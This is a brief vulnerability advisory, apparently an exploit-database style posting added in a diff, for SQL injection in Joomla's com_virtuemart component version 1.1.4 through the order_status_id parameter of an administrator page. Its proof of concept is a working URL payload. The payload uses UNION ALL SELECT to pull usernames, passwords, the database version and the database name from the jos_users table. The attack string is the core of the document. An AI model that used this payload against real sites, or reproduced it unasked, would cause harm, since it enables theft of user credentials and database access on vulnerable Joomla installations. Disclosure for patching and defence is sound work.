@@ -1,0 +1,32 @@
+[~]>> ...[BEGIN ADVISORY]...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> TITLE: Joomla (com_virtuemart) SQL Injection Vulnerability 
+[~]>> LANGUAGE: PHP
+[~]>> DORK: N/A
+[~]>> RESEARCHER: B-HUNT3|2
+[~]>> CONTACT: bhunt3r[at_no_spam]gmail[dot_no_spam]com
+[~]>> TESTED ON: LocalHost
+[~]>> PRE-REQUERIMENTS: Privileged user
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> DESCRIPTION: Input var order_status_id is vulnerable to SQL Code Injection
+[~]>> AFFECTED VERSIONS: Confirmed in 1.1.4 stable but probably other versions also
+[~]>> RISK: Low/Medium
+[~]>> IMPACT: Execute Arbitrary SQL queries
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> PROOF OF CONCEPT:
+
+[~]>> http://[HOST]/[JOOMLA_PATH]/administrator/index.php?page=order.order_status_form&limitstart=0&keyword=&order_status_id=[SQL]&option=com_virtuemart
+[~]>> http://[HOST]/[JOOMLA_PATH]/administrator/index.php?page=order.order_status_form&limitstart=0&keyword=&order_status_id=-1%27+UNION+ALL+SELECT+1,username,password,@@version,database%28%29,6+FROM+jos_users%23&option=com_virtuemart
+
+[~]>> Note: There are more affected vars.
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> ...[END ADVISORY]...
+ 
